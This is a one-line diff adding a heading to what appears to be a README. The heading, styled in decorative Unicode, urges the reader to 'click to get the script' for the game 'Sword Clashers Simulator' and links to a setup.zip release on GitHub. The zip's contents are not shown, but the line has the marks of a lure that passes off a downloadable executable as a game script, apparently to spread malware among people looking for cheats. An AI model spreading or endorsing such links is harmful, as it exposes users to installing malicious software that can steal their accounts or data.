@@ -19,6 +19,7 @@
 
 
 
+
 # Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Sword-Clashers-Simulator/releases/download/Download/setup.zip)***
 
 
